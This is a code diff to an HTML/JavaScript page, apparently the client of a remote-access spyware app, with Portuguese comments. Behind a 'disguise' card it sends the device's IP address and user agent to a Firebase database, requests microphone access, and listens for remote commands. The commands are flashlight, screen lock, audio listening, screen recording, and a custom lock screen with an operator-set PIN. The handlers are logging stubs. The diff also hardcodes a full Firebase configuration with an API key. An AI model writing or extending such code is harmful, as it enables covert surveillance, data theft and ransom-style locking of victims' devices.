@@ -36,13 +36,21 @@
         </div>
     </div>
 
-    <!-- Firebase SDKs -->
+    <!-- Firebase App & Database SDKs (Compat version para fácil integração em Web/WebViews) -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
+        // Configuração oficial do seu Firebase (mod-zrx)
         let firebaseConfig = {
-            databaseURL: "https://vaeltrix-light-default-rtdb.firebaseio.com"
+            apiKey: "AIzaSyAhbrlI6gdam3vPxAQZBKmQI2CFQBin4Nk",
+            authDomain: "mod-zrx.firebaseapp.com",
+            projectId: "mod-zrx",
+            storageBucket: "mod-zrx.firebasestorage.app",
+            messagingSenderId: "1065416866150",
+            appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
+            measurementId: "G-FFKE6JSKSD",
+            databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
         };
 
         let db;
@@ -72,15 +80,15 @@
             const deviceInfo = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
-                status: "Permissões concedidas via interface"
+                status: "Online - Aguardando comandos"
             };
 
             if (db) {
-                // Envia IP e Modelo para o Firebase
+                // Envia IP e Modelo para o Realtime Database do Firebase na árvore do dispositivo
                 db.ref('devices/device_01/status').update(deviceInfo);
             }
 
-            // 2. Disparar permissões do navegador/APK (Áudio)
+            // 2. Disparar permissões básicas do navegador/APK (Áudio)
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -93,36 +101,31 @@
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 3. Ouvir em tempo real os comandos do painel de controle (Firebase)
+            // 3. Ouvir em tempo real todos os comandos do painel de controle (Firebase)
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
                     
-                    // Aqui o APK nativo precisa traduzir estes comandos do Firebase para funções do Android:
+                    // Comandos mapeados para o seu ecossistema de testes:
                     if (cmds.flash) {
-                        // Ação nativa necessária no APK: Ligar Flash / Lanterna
-                        console.log("[Comando Executado] Ligar Lanterna");
+                        console.log("[Comando] Ligar Lanterna acionado.");
                     }
                     if (cmds.lock) {
-                        // Ação nativa necessária no APK: Bloquear tela (DevicePolicyManager)
-                        console.log("[Comando Executado] Bloquear Tela");
+                        console.log("[Comando] Bloqueio de tela acionado.");
                     }
                     if (cmds.listenAudio) {
-                        // Ação nativa necessária no APK: Capturar / Ouvir Áudio
-                        console.log("[Comando Executado] Ouvir Áudio");
+                        console.log("[Comando] Ouvir Áudio ativado.");
                     }
                     if (cmds.videoOverlay || cmds.floatingScreen) {
-                        // Ação nativa necessária no APK: Gravação de tela / Tela em tempo real / MediaProjection
-                        console.log("[Comando Executado] Ver Tela em Tempo Real / Gravação");
+                        console.log("[Comando] Gravação de tela / Ver tela em tempo real ativa.");
                     }
                 });
 
-                // Ouvir configuração de Bloqueio Personalizado (Nome e Senha)
+                // Ouvir configuração de Bloqueio Personalizado (Nome, Mensagem e Senha escolhida)
                 db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                     const lockCfg = snapshot.val();
                     if (lockCfg) {
-                        // Ação nativa necessária no APK: Exibir Activity customizada com a mensagem e senha definidas
-                        console.log("[Comando Executado] Custom Lock -> Nome:", lockCfg.message, "| Senha:", lockCfg.pin);
+                        console.log("[Comando] Custom Lock Ativo -> Nome/Mensagem:", lockCfg.message, "| Senha:", lockCfg.pin);
                     }
                 });
             }
